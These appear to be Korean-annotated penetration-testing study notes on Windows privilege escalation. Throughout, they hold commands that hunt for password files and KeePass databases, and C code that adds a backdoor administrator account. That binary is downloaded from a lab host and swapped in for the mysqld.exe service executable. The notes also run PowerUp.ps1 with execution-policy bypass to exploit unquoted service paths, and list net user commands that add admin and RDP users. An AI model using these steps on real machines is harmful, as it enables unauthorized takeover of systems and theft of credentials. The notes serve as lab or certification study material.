```powershell
findstr /SIM /C:"pass" *.txt *.pdf *.xls *.xlsx *.doc *.docx *kdbx,*ini *.xml *.cfg *.config
```
- `/S`: 현재 디렉토리뿐 아니라 **하위 디렉토리까지 재귀적으로 검색**
- `/I`: **대소문자를 구분하지 않고** 검색
- `/M`: 문자열이 포함된 **파일 이름만 출력**

```bash
xampp
```
---
```powershell
Get-LocalUser

Get-LocalGroup

Get-LocalGroupMember adminteam
```
```powershell
systeminfo

ipconfig /all

route print

netstat -ano
```
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
- 64비트 Windows에서 32비트 프로그램의 설치 목록을 레지스트리에서 조회합니다. 프로그램 이름(DisplayName)만 표시합니다.

Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
- 64비트 Windows에서 64비트 프로그램의 설치 목록을 레지스트리에서 조회합니다. 프로그램 이름(DisplayName)만 표시합니다.

Get-Process
```
```powershell
Get-ChildItem -Path C:\ `
 -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*kdbx,*ini `
 -File -Recurse -ErrorAction SilentlyContinue
```
```powershell
runas /user:backupadmin cmd
- 'backupadmin' 계정으로 명령 프롬프트(cmd)를 실행합니다. 해당 계정의 비밀번호 입력이 필요합니다.
```
```powershell
Get-History

(Get-PSReadlineOption).HistorySavePath
```
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
- 현재 실행 중인 Windows 서비스 목록을 조회합니다.

icacls "C:\xampp\apache\bin\httpd.exe"
- 지정된 파일(httpd.exe)의 접근 권한 목록을 표시하거나 수정합니다. 현재는 권한 확인 용도로 사용됩니다.
```
---
# Service Binary Hijacking
```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```
```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```
```powershell
iwr -uri http://192.168.48.3/adduser.exe -Outfile adduser.exe

move C:\xampp\mysql\bin\mysqld.exe mysqld.exe

move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe

net stop mysql

whoami /priv

shutdown /r /t 0
```
```powershell
iwr -uri http://192.168.48.3/PowerUp.ps1 -Outfile PowerUp.ps1

powershell -ep bypass

. .\PowerUp.ps1

Get-ModifiableServiceFile
- 서비스 실행 파일에 일반 사용자 쓰기 권한이 있는 경우를 찾아냄.
- 이 취약점은 악성 파일로 서비스 실행 파일을 교체하여 권한 상승(Privilege Escalation)이 가능하게 만듦.
```
---
# Unquoted Service Paths
```powershell
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
- WMIC를 사용하여 서비스 이름(`name`)과 실행 파일 경로(`pathname`)를 조회.
- C:\windows\\ 경로 제외한뒤 "가 포함된 경로 제외

Start-Service GammaService

Stop-Service GammaService

icacls "C:\Program Files\Enterprise Apps"
- 지정된 폴더(`C:\Program Files\Enterprise Apps`)의 ACL(Access Control List, 접근 제어 목록)을 표시.
- 해당 디렉터리에 대한 사용자·그룹별 권한(읽기, 쓰기, 실행 등)을 확인 가능.
- 권한이 잘못 설정된 경우 보안 취약점이 될 수 있음.
```
```powershell
#PowerUp.ps1
Get-UnquotedService

Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"

Restart-Service GammaService
```
---
# Scheduled Tasks
```powershell
schtasks /query /fo LIST /v
```
---
# Windows Privilege Escalation — Token Impersonation (SeImpersonatePrivilege)
- https://usersince99.medium.com/windows-privilege-escalation-token-impersonation-seimpersonateprivilege-364b61017070
- https://github.com/ohpe/juicy-potato `CLSID`
---
# Windows Add User Command
```powershell
#To create a user named api with a password of Dork123!
net user api Dork123! /add

#To add to the administrator and RDP groups
net localgroup Administrators api /add
net localgroup 'Remote Desktop Users' api /add
```
